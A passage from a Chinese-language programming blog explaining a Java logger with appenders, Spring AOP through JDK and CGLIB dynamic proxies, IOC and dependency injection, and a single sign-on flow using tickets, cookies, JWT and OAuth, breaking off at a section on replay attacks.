function_">addAppender</span>(<span class="params"><span class="title class_">Appender</span> appender</span>) &#123;</span><br><span class="line">        appenders.<span class="title function_">add</span>(appender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">void</span> <span class="title function_">log</span>(<span class="params"><span class="title class_">Priority</span> logLevel, <span class="title class_">String</span> message</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (logLevel.<span class="title function_">ordinal</span>() &gt;= level.<span class="title function_">ordinal</span>()) &#123;</span><br><span class="line">            <span class="title class_">LoggerEvent</span> event = <span class="keyword">new</span> <span class="title class_">LoggerEvent</span>(name, logLevel, message);</span><br><span class="line">            <span class="keyword">for</span> (<span class="title class_">Appender</span> appender : appenders) &#123;</span><br><span class="line">                appender.<span class="title function_">append</span>(event);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">void</span> <span class="title function_">info</span>(<span class="params"><span class="title class_">String</span> msg</span>) &#123; <span class="title function_">log</span>(<span class="title class_">Priority</span>.<span class="property">INFO</span>, msg); &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">void</span> <span class="title function_">error</span>(<span class="params"><span class="title class_">String</span> msg</span>) &#123; <span class="title function_">log</span>(<span class="title class_">Priority</span>.<span class="property">ERROR</span>, msg); &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">void</span> <span class="title function_">debug</span>(<span class="params"><span class="title class_">String</span> msg</span>) &#123; <span class="title function_">log</span>(<span class="title class_">Priority</span>.<span class="property">DEBUG</span>, msg); &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">✅ 三、使用示例</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">void</span> <span class="title function_">main</span>(<span class="params"><span class="title class_">String</span>[] args</span>) &#123;</span><br><span class="line">        <span class="title class_">Logger</span> logger = <span class="keyword">new</span> <span class="title class_">Logger</span>(<span class="string">&quot;MyAppLogger&quot;</span>, <span class="title class_">Priority</span>.<span class="property">DEBUG</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 添加两个输出器</span></span><br><span class="line">        logger.<span class="title function_">addAppender</span>(<span class="keyword">new</span> <span class="title class_">ConsoleAppender</span>(<span class="keyword">new</span> <span class="title class_">SimpleFormatter</span>()));</span><br><span class="line">        logger.<span class="title function_">addAppender</span>(<span class="keyword">new</span> <span class="title class_">FileAppender</span>(<span class="string">&quot;app.log&quot;</span>, <span class="keyword">new</span> <span class="title class_">JsonFormatter</span>()));</span><br><span class="line"></span><br><span class="line">        logger.<span class="title function_">info</span>(<span class="string">&quot;系统初始化完成&quot;</span>);</span><br><span class="line">        logger.<span class="title function_">debug</span>(<span class="string">&quot;加载配置文件中...&quot;</span>);</span><br><span class="line">        logger.<span class="title function_">error</span>(<span class="string">&quot;系统启动失败：端口占用&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>AOP和IOC</h1>
<h2 id="✅-一、Java-是静态强类型语言，那如何“动态增强”？">✅ 一、Java 是静态强类型语言，那如何“动态增强”？</h2>
<p>Java 编译后是 <code>.class</code> 文件，理论上是“定死”的，但为了在运行期添加功能（比如日志、事务），有三种主要方式：</p>
<h2 id="🔧-方法一：编译期织入（静态织入）（如-AspectJ）">🔧 方法一：<strong>编译期织入（静态织入）</strong>（如 AspectJ）</h2>
<blockquote>
<p>也就是你说的“在编译时做手脚”。</p>
</blockquote>
<h3 id="✨-特点：">✨ 特点：</h3>
<ul>
<li>需要增强编译器（AspectJ Compiler）</li>
<li>AOP 切面代码在编译期已经织入业务类字节码中</li>
<li>最终生成的类已经包含了日志、事务等逻辑</li>
</ul>
<h3 id="⚠️-缺点：">⚠️ 缺点：</h3>
<ul>
<li>可维护性差，调试复杂</li>
<li>原始类会被修改，失去纯净性</li>
</ul>
<h2 id="🧙-方法二：运行期织入（动态代理）（Spring-AOP-常用方式）">🧙 方法二：<strong>运行期织入（动态代理）</strong>（Spring AOP 常用方式）</h2>
<blockquote>
<p>你说的“瞒天过海” —— 动态代理。</p>
</blockquote>
<p>这里有两种主流实现方式：</p>
<h2 id="✅-1）JDK-动态代理（Java-自带）">✅ 1）JDK 动态代理（Java 自带）</h2>
<h3 id="🧩-要求：">🧩 要求：</h3>
<ul>
<li>被代理的类<strong>必须实现接口</strong></li>
</ul>
<h3 id="🧠-实现方式：">🧠 实现方式：</h3>
<ul>
<li>使用 <code>java.lang.reflect.Proxy</code> 类动态生成一个代理类，实现了同样的接口</li>
<li>代理类中会调用 <code>InvocationHandler#invoke()</code> 方法，这里加入“切面逻辑”</li>
</ul>
<h3 id="✅-示例结构：">✅ 示例结构：</h3>
<p>// 👉 接口：这是 JDK 动态代理的要求，必须存在</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">interface OrderService &#123;</span><br><span class="line">    void placeOrder(); <span class="string">``</span>&#125; <span class="string">`// 👉 实现类：业务逻辑实际写在这里 `</span><span class="class"><span class="keyword">class</span> <span class="title">OrderServiceImpl</span> <span class="title">implements</span> <span class="title">OrderService</span> </span>&#123;</span><br><span class="line">    public void placeOrder() &#123; <span class="string">``</span>        System.out.println(<span class="string">&quot;执行下单操作&quot;</span>); <span class="string">``</span>    &#125; <span class="string">``</span>&#125; <span class="string">` `</span>// 代理处理器// 👉 InvocationHandler：这是代理逻辑封装的地方 <span class="string">``</span><span class="class"><span class="keyword">class</span> <span class="title">LogHandler</span> <span class="title">implements</span> <span class="title">InvocationHandler</span> </span>&#123; <span class="string">``</span>    Object target; <span class="string">``</span>    public LogHandler(Object target) &#123;</span><br><span class="line">        this.target = target; <span class="string">``</span>    &#125; <span class="string">``</span>    </span><br><span class="line">    public Object invoke(Object proxy, Method <span class="function"><span class="keyword">method</span>, <span class="title">Object</span>[] <span class="title">args</span>) <span class="title">throws</span> <span class="title">Throwable</span> </span>&#123; <span class="string">``</span>        System.out.println(<span class="string">&quot;开始日志...&quot;</span>);</span><br><span class="line">        Object result = method.invoke(target, args); <span class="string">``</span>        System.out.println(<span class="string">&quot;结束日志...&quot;</span>);<span class="keyword">return</span> result; <span class="string">``</span>    &#125; <span class="string">``</span>&#125; <span class="string">` `</span>// 生成代理// 👉 创建代理对象：这个 proxy 会实现 OrderService 接口 <span class="string">``</span>OrderService service = new OrderServiceImpl();<span class="string">` `</span>OrderService proxy = (OrderService) Proxy.newProxyInstance( <span class="string">``</span>    service.getClass().getClassLoader(), <span class="string">``</span>    service.getClass().getInterfaces(),</span><br><span class="line">    new LogHandler(service)); <span class="string">``</span>proxy.placeOrder(); <span class="regexp">//</span> 实际执行的是代理方法</span><br></pre></td></tr></table></figure>
<h2 id="✅-2）CGLIB-动态代理（通过继承生成子类）">✅ 2）CGLIB 动态代理（通过继承生成子类）</h2>
<h3 id="🧩-要求：-2">🧩 要求：</h3>
<ul>
<li>被代理的类<strong>不能是 final</strong></li>
<li>被代理的方法<strong>不能是 final/static/private</strong></li>
</ul>
<h3 id="🧠-实现方式：-2">🧠 实现方式：</h3>
<ul>
<li>CGLIB 会生成目标类的子类，并重写目标方法</li>
<li>在重写方法中添加切面逻辑，再调用 <code>super.method()</code></li>
</ul>
<h3 id="✅-示例结构（Spring-内部使用-Enhancer）：">✅ 示例结构（Spring 内部使用 Enhancer）：</h3>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OrderService</span> </span>&#123;</span><br><span class="line">    public void placeOrder() &#123; <span class="string">``</span>        System.out.println(<span class="string">&quot;执行下单操作&quot;</span>); <span class="string">``</span>    &#125; <span class="string">``</span>&#125; <span class="string">` `</span>MethodInterceptor interceptor = new MethodInterceptor() &#123;</span><br><span class="line">    public Object intercept(Object obj, Method <span class="function"><span class="keyword">method</span>, <span class="title">Object</span>[] <span class="title">args</span>, <span class="title">MethodProxy</span> <span class="title">proxy</span>) <span class="title">throws</span> <span class="title">Throwable</span> </span>&#123; <span class="string">``</span>        System.out.println(<span class="string">&quot;开始日志...&quot;</span>);</span><br><span class="line">        Object result = proxy.invokeSuper(obj, args); <span class="string">``</span>        System.out.println(<span class="string">&quot;结束日志...&quot;</span>);<span class="keyword">return</span> result; <span class="string">``</span>    &#125; <span class="string">``</span>&#125;; <span class="string">` `</span>OrderService proxy = (OrderService) Enhancer.create(OrderService.class, interceptor); <span class="string">``</span>proxy.placeOrder();</span><br></pre></td></tr></table></figure>
<h2 id="✅-四、Spring-AOP-的默认行为">✅ 四、Spring AOP 的默认行为</h2>
<blockquote>
<p>Spring AOP 默认采用“运行期代理”，并自动根据你的目标类是否实现接口来选择：</p>
</blockquote>
<ul>
<li><code>有接口：用 JDK 动态代理 ``无接口：用 CGLIB</code></li>
</ul>
<p>你可以通过配置强制使用 CGLIB：</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;aop:config proxy-target-<span class="keyword">class</span>=<span class="string">&quot;true&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
<p>或者在注解模式中：</p>
<figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@EnableAspectJAutoProxy</span>(proxyTargetClass = <span class="keyword">true</span>)</span><br></pre></td></tr></table></figure>
<h2 id="✅-五、结语">✅ 五、结语</h2>
<p>总结就是：</p>
<ul>
<li>Java 虽然是静态语言，但通过动态代理和字节码增强，可以实现非常灵活的运行期增强；</li>
<li>AOP 在实际开发中，极大地简化了日志、事务、安全等“横切逻辑”的开发；</li>
</ul>
<h2 id="AOP、IOC、DI对比">AOP、IOC、DI对比</h2>
<h2 id="✅-一、IOC（控制反转）——谁负责创建对象？">✅ 一、IOC（控制反转）——谁负责创建对象？</h2>
<h3 id="✅-1-1-概念：">✅ 1.1 概念：</h3>
<blockquote>
<p><strong>IOC（Inversion of Control）控制反转</strong>，指的是<strong>对象的控制权（即创建、管理）从程序员手中“反转”到了 Spring 容器</strong>。</p>
</blockquote>
<h3 id="✅-1-2-举例说明：">✅ 1.2 举例说明：</h3>
<p>我们原来是这样写的 👇：</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EmailService emailService = <span class="keyword">new</span> EmailServiceImpl();<span class="string">` `</span>PlaceOrderCommand command = <span class="keyword">new</span> PlaceOrderCommand(); <span class="string">``</span>command.setEmailService(emailService);</span><br></pre></td></tr></table></figure>
<p>使用 IOC 后，我们让 <strong>容器来负责对象的创建</strong>：</p>
<figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">&quot;app.xml&quot;</span>);<span class="string">` `</span>PlaceOrderCommand command = context.getBean(<span class="string">&quot;placeOrderCommand&quot;</span>,PlaceOrderCommand.<span class="keyword">class</span>);</span><br></pre></td></tr></table></figure>
<p>我们只调用 <code>getBean()</code>，不再关心谁去 new，new 的是不是代理，是否提前增强了功能。</p>
<h3 id="✅-1-3-核心点：">✅ 1.3 核心点：</h3>
<ul>
<li><strong>创建对象的责任交给 Spring 容器</strong></li>
<li>容器通过 XML、注解、JavaConfig 等方式扫描配置</li>
<li>对象一旦注册为 Bean，就由容器管理生命周期</li>
</ul>
<h2 id="✅-二、DI（依赖注入）——对象怎么获取依赖？">✅ 二、DI（依赖注入）——对象怎么获取依赖？</h2>
<h3 id="✅-2-1-概念：">✅ 2.1 概念：</h3>
<blockquote>
<p><strong>DI（Dependency Injection）依赖注入</strong> 是 IOC 的一种实现方式，<strong>对象不再自己创建依赖，而是由容器把依赖注入进来</strong>。</p>
</blockquote>
<h3 id="✅-2-2-举例说明：">✅ 2.2 举例说明：</h3>
<h4 id="传统方式-👇">传统方式 👇</h4>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">PlaceOrderCommand</span> </span>&#123;</span><br><span class="line">    private EmailService emailService = new EmailServiceImpl(); <span class="string">``</span>&#125;</span><br></pre></td></tr></table></figure>
<p>硬编码创建依赖，耦合度高、无法替换、无法测试。</p>
<h4 id="使用-DI-👇">使用 DI 👇</h4>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">PlaceOrderCommand</span> </span>&#123;</span><br><span class="line">    private EmailService emailService; <span class="string">``</span>    // 构造器注入 或 Setter 注入 <span class="string">``</span>    public void setEmailService(EmailService emailService)&#123;                               this.emailService = emailService; <span class="string">``</span>    &#125; <span class="string">``</span>&#125;</span><br></pre></td></tr></table></figure>
<p>然后 Spring 配置：</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean id=<span class="string">&quot;emailService&quot;</span> <span class="keyword">class</span>=&quot;<span class="symbol">EmailServiceImpl</span>&quot;/&gt;` `&lt;<span class="symbol">bean</span> <span class="symbol">id</span>=&quot;<span class="symbol">placeOrderCommand</span>&quot; <span class="symbol">class</span>=&quot;<span class="symbol">PlaceOrderCommand</span>&quot;&gt;</span><br><span class="line">   &lt;<span class="symbol">property</span> <span class="symbol">name</span>=&quot;<span class="symbol">emailService</span>&quot; <span class="symbol">ref</span>=&quot;<span class="symbol">emailService</span>&quot;/&gt;` `&lt;/<span class="symbol">bean</span>&gt;</span><br></pre></td></tr></table></figure>
<p>容器负责：</p>
<ul>
<li>创建 <code>EmailServiceImpl</code></li>
<li>创建 <code>PlaceOrderCommand</code></li>
<li>调用 <code>setEmailService()</code> 注入依赖</li>
</ul>
<h3 id="✅-2-3-注解方式（推荐）：">✅ 2.3 注解方式（推荐）：</h3>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">@Component</span> <span class="string">``</span>public <span class="class"><span class="keyword">class</span> <span class="title">EmailServiceImpl</span> <span class="title">implements</span> <span class="title">EmailService</span> </span>&#123;&#125; <span class="string">` `</span><span class="variable">@Component</span> <span class="string">``</span>public <span class="class"><span class="keyword">class</span> <span class="title">PlaceOrderCommand</span> </span>&#123;</span><br><span class="line">    <span class="variable">@Autowired</span> <span class="string">``</span>    private EmailService emailService; <span class="string">``</span>&#125;</span><br></pre></td></tr></table></figure>
<h2 id="✅-三、AOP（面向切面编程）——功能增强怎么做？">✅ 三、AOP（面向切面编程）——功能增强怎么做？</h2>
<h3 id="✅-3-1-概念：">✅ 3.1 概念：</h3>
<blockquote>
<p><strong>AOP（Aspect-Oriented Programming）</strong> 是一种将日志、安全、事务、性能监控等“横切关注点”从业务代码中分离出来的编程方式。</p>
</blockquote>
<h3 id="✅-3-2-举例说明：">✅ 3.2 举例说明：</h3>
<p>你只想写业务逻辑👇：</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execute</span>()</span> &#123;</span><br><span class="line">   <span class="comment">// 下单逻辑` `&#125;</span></span><br></pre></td></tr></table></figure>
<p>你不想自己去加事务、日志、耗时统计：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">System</span>.<span class="keyword">out</span>.println(&quot;开始记录日志&quot;);` `long start = <span class="keyword">System</span>.currentTimeMillis(); ``<span class="keyword">execute</span>(); // 核心逻辑 ``long end = <span class="keyword">System</span>.currentTimeMillis(); ``<span class="keyword">System</span>.<span class="keyword">out</span>.println(&quot;耗时：&quot; + (<span class="keyword">end</span> - <span class="keyword">start</span>));</span><br></pre></td></tr></table></figure>
<h3 id="✅-3-3-使用-AOP-后：">✅ 3.3 使用 AOP 后：</h3>
<p>我们用一个“切面”类来定义这些重复逻辑：</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Aspect</span> <span class="string">``</span><span class="meta">@Component</span> <span class="string">``</span><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LoggerAspect</span> &#123;</span><br><span class="line">    <span class="meta">@Before</span>(<span class="string">&quot;execution(* com.example.PlaceOrderCommand.execute(..))&quot;</span>) <span class="string">``</span>    <span class="keyword">public</span> <span class="built_in">void</span> <span class="title function_">logBefore</span>(<span class="params"></span>) &#123; <span class="string">``</span>        <span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(<span class="string">&quot;【日志】开始执行方法&quot;</span>); <span class="string">``</span>    &#125; <span class="string">``</span>    <span class="meta">@After</span>(<span class="string">&quot;execution(* com.example.PlaceOrderCommand.execute(..))&quot;</span>) <span class="string">``</span>    <span class="keyword">public</span> <span class="built_in">void</span> <span class="title function_">logAfter</span>(<span class="params"></span>) &#123; <span class="string">``</span>        <span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(<span class="string">&quot;【日志】方法执行完毕&quot;</span>); <span class="string">``</span>    &#125; <span class="string">``</span>&#125;</span><br></pre></td></tr></table></figure>
<p>Spring 自动为你生成代理对象，在方法执行前后插入这些逻辑。</p>
<h2 id="✅-四、IOC、DI、AOP-的关系图解：">✅ 四、IOC、DI、AOP 的关系图解：</h2>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">┌─────────────┐ <span class="string">``</span>          │   Spring容器 │ <span class="string">``</span>          └────┬────────┘ <span class="string">``</span>               │ <span class="string">``</span>        ┌──────▼─────────┐ <span class="string">``</span>        │ IOC：统一创建和管理对象         │ <span class="string">``</span>        └──────┬─────────┘ <span class="string">``</span>               │ <span class="string">``</span>      ┌────────▼─────┐ <span class="string">``</span>      │ DI：将依赖注入对象 │ <span class="string">``</span>      └────────┬─────┘ <span class="string">``</span>               │ <span class="string">``</span>      ┌────────▼───────────────┐ <span class="string">``</span>      │ AOP：为容器管理的对象增强功能 │ <span class="string">``</span>      └───────────────────────┘</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>IOC 负责接管对象创建</li>
<li>DI 负责注入依赖</li>
<li>AOP 在这些对象上添加横切功能</li>
<li><strong>三者协作，共同构建 Spring 强大的编程模型</strong></li>
</ul>
</blockquote>
<h1>SSO单点登录</h1>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YTQ3N2UzNTRhNWZhM2EwOTQ5YTMwYmUwYzc0YTNjNTNfcVpoSkIwU243U0lUVkJQa0VOWWZqY3UwcW1sN0l1WjBfVG9rZW46TGdLRmJOYVBRb2xueXN4NDc2RGNZUERmbjJjXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTlhNDVmYWE4MDExZmFmODExMDdkMmEyNThiZTExNTZfek5VV2ZhQkI5Slk2N1JqamljMkY3S1NVd0c3U21CZ3pfVG9rZW46Q09JcWJDQktpb1hrSmF4RVpyOWMzU0J6blJoXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="🧠-背景知识：参与者">🧠 背景知识：参与者</h2>
<ul>
<li><code>a.com</code>：业务系统（比如 CRM、OA 等）</li>
<li><code>sso.com</code>：统一认证中心（SSO Server）</li>
<li>浏览器：用户的客户端，负责发起请求和接收响应</li>
</ul>
<h2 id="✅-图中流程逐步解析">✅ 图中流程逐步解析</h2>
<h3 id="1）用户首次访问受保护资源"><strong>1）用户首次访问受保护资源</strong></h3>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户访问 <span class="string">``</span>www.a.com/pageA</span><br></pre></td></tr></table></figure>
<ul>
<li>系统检测用户没有登录（即未携带有效 Cookie），于是将请求重定向到 SSO 登录中心。</li>
</ul>
<h3 id="2）跳转到认证中心登录"><strong>2）跳转到认证中心登录</strong></h3>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">302 </span>Redirect → ``www.sso.<span class="keyword">com</span>/login?redirect=www.a.<span class="keyword">com</span>/pageA</span><br></pre></td></tr></table></figure>
<ul>
<li>浏览器被重定向到统一登录页面，并携带参数 <code>redirect</code>，说明登录成功后要跳回 <code>a.com/pageA</code>。</li>
</ul>
<h3 id="3）SSO-系统检查是否已登录"><strong>3）SSO 系统检查是否已登录</strong></h3>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">展示登录 <span class="selector-tag">form</span></span><br></pre></td></tr></table></figure>
<ul>
<li>SSO 检测当前用户在 <code>sso.com</code> 的 Cookie（如 <code>ssoid</code>）也不存在，因此返回登录页面。</li>
</ul>
<h3 id="4）用户提交用户名和密码"><strong>4）用户提交用户名和密码</strong></h3>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">POST</span> 用户名 + 密码</span><br></pre></td></tr></table></figure>
<ul>
<li>用户填写表单提交后，SSO 会校验用户身份。</li>
<li>登录成功后，SSO：
<ul>
<li>✅ 创建自己的 session；</li>
<li>✅ 生成一个临时令牌 <strong>ticket</strong>（如 <code>T123</code>）；</li>
<li>✅ 设置 Cookie：<code>Set-Cookie: ssoid=1234; Domain=sso.com</code></li>
</ul>
</li>
</ul>
<h3 id="5）SSO-重定向回原业务系统-a-com"><strong>5）SSO 重定向回原业务系统 <a target="_blank" rel="noopener" href="http://a.com">a.com</a></strong></h3>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">302 </span>Redirect → www.a.<span class="keyword">com</span>/pageA?ticket=T123</span><br></pre></td></tr></table></figure>
<ul>
<li>ticket 是一次性的临时票据，用于告诉 <a target="_blank" rel="noopener" href="http://a.com">a.com</a>：“这是认证中心签发的，用户已经登录了”。</li>
</ul>
<h3 id="6）a-com-拿到-ticket，向认证中心验证"><strong>6）<a target="_blank" rel="noopener" href="http://a.com">a.com</a> 拿到 ticket，向认证中心验证</strong></h3>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">浏览器访问 www.a.com/pageA?<span class="attribute">ticket</span>=T123</span><br></pre></td></tr></table></figure>
<ul>
<li>业务系统检测到 URL 中带有 ticket，于是：
<ul>
<li>拿着 <code>T123</code> 向 <code>sso.com</code> 后台请求：<strong>这个 ticket 有效吗？</strong></li>
<li>如果验证通过，说明用户确实登录过。</li>
</ul>
</li>
</ul>
<h3 id="7）a-com-创建自己的-session-cookie"><strong>7）<a target="_blank" rel="noopener" href="http://a.com">a.com</a> 创建自己的 session + cookie</strong></h3>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: <span class="attribute">sessionid</span>=xxxx; <span class="attribute">Domain</span>=a.com</span><br></pre></td></tr></table></figure>
<ul>
<li>然后 <a target="_blank" rel="noopener" href="http://a.com">a.com</a> 给用户设置自己的 Cookie，保存 session；</li>
<li>后续用户再访问 <a target="_blank" rel="noopener" href="http://a.com">a.com</a> 的页面就不需要再跳转了。</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YjdiNzQ2MGZhNWJhNzYxMzc0ZmY0OWY2YzM2MWU4NTdfenNpNzdEZkhuM0NsTWFRTUdvek55cjZVc0RmTjJYQ1RfVG9rZW46Q012VWI3MlBxb1FVZDJ4VkF5RGNseVlsbjllXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<blockquote>
<p>进一步深入：</p>
<p>二次登录如何免登录？</p>
<p>多系统退出如何同步？</p>
<p>如何防止 ticket 被重放攻击？</p>
<p>SSO 如何和 JWT、OAuth 结合？</p>
</blockquote>
<h2 id="✅-一、二次登录如何免登录？">✅ 一、二次登录如何免登录？</h2>
<h3 id="✅-场景重现：">✅ 场景重现：</h3>
<p>用户已经登录过一次某个系统（如 <a target="_blank" rel="noopener" href="http://a.com">a.com</a>），然后访问另一个系统（如 <a target="_blank" rel="noopener" href="http://b.com">b.com</a>），希望不再输入用户名密码。</p>
<h3 id="✅-原理：">✅ 原理：</h3>
<ul>
<li>当用户访问 <code>b.com</code> 时，<a target="_blank" rel="noopener" href="http://b.com">b.com</a> 会发现自己本地没有登录态；</li>
<li>然后 <a target="_blank" rel="noopener" href="http://b.com">b.com</a> 会重定向用户去 SSO（如 <code>sso.com?redirect=b.com/pageB</code>）；</li>
<li>此时浏览器会自动携带 <code>ssoid=1234</code>（SSO 域的 cookie）；</li>
<li>SSO 服务根据 ssoid 判断用户已经登录，<strong>直接生成 ticket</strong>，重定向回 <code>b.com</code>；</li>
<li><code>b.com</code> 拿到 ticket 向 SSO 验证成功 → 登录成功，创建本地 session。</li>
</ul>
<h3 id="✅-小结：">✅ 小结：</h3>
<p><strong>只要浏览器还保存着 SSO 的 Cookie（ssoid）且未过期，所有系统都可实现免登录。</strong></p>
<h2 id="✅-二、多系统退出如何同步？">✅ 二、多系统退出如何同步？</h2>
<h3 id="✅-场景：">✅ 场景：</h3>
<p>用户点击退出系统 <a target="_blank" rel="noopener" href="http://a.com">a.com</a>，要求所有系统（<a target="_blank" rel="noopener" href="http://b.com">b.com</a>、<a target="_blank" rel="noopener" href="http://c.com">c.com</a>）都一并退出。</p>
<h3 id="✅-解决方案：统一退出通知机制">✅ 解决方案：<strong>统一退出通知机制</strong></h3>
<h4 id="🌟-两种常见方法：">🌟 两种常见方法：</h4>
<h4 id="1-主动通知（Logout-Notification）">1. <strong>主动通知（Logout Notification）</strong></h4>
<ul>
<li>用户在 <a target="_blank" rel="noopener" href="http://a.com">a.com</a> 点击退出 → <a target="_blank" rel="noopener" href="http://a.com">a.com</a> 调用 SSO 的登出接口；</li>
<li>SSO 接收到请求后，通知所有已登录的系统（如 <a target="_blank" rel="noopener" href="http://b.com">b.com</a>、<a target="_blank" rel="noopener" href="http://c.com">c.com</a>）；</li>
<li>各系统收到通知后，清除自己的 session。</li>
</ul>
<h4 id="2-前端-iframe-注销">2. <strong>前端 iframe 注销</strong></h4>
<ul>
<li>退出时，SSO 页面用 JS 创建多个 iframe，分别访问 <code>b.com/logout</code>, <code>c.com/logout</code> 等退出地址；</li>
<li>各系统收到 iframe 请求，清除登录态；</li>
<li>缺点是依赖浏览器支持，跨域受限较多。</li>
</ul>
<h2 id="✅-三、如何防止-ticket-被重放攻击？">✅ 三、如何防止 ticket 被重放攻击？</h2>
<h3 id="✅-问题：">✅ 问题：</h3>
<p>ticket 是一次性票据，如果被截获并重复使用，可能造成严重后果。</p>
<h3 id="✅-防御方案：">✅ 防御方案：</h3>
<p>如图</p>
<h2 id="✅-四、SSO-如何结合-JWT-OAuth-使用？">✅ 四、SSO 如何结合 JWT/OAuth 使用？</h2>
<h3 id="✅-JWT-场景（适合前后端分离、移动端等）：">✅ JWT 场景（适合前后端分离、移动端等）：</h3>
<ol>
<li>用户登录成功后，SSO 返回一个 <strong>JWT（JSON Web Token）</strong>；</li>
<li>用户将 JWT 保存在本地（如 localStorage）；</li>
<li>后续每次访问业务系统，携带 <code>Authorization: Bearer &lt;JWT&gt;</code>；</li>
<li>各业务系统使用公钥验证 JWT 签名，确认合法性；</li>
<li>无需共享 session，不需要跨域 cookie，完全分布式。</li>
</ol>
<p>✅ 优点：轻量、安全、适合微服务与无状态应用。</p>
<h3 id="✅-OAuth-场景（对外提供登录授权）：">✅ OAuth 场景（对外提供登录授权）：</h3>
<p>比如你在用“QQ/微信登录”某个网站，其实就是用 OAuth 做的 SSO。</p>
<ol>
<li>用户点击“用QQ登录” → 跳转到 QQ 的授权中心；</li>
<li>用户授权登录后，回调回网站并附带 <code>code</code>；</li>
<li>网站用这个 <code>code</code> 向 QQ 服务器换取 AccessToken；</li>
<li>拿到 AccessToken 后可获取用户信息、登录成功。</li>
</ol>
<p>✅ 优点：支持<strong>跨系统、跨平台登录授权</strong>，用户无需重复注册。</p>
<h2 id="✅-什么是重放攻击（Replay-Attack）？">✅ 什么是重放攻击（Replay Attack）？</h2>
<blockquote>
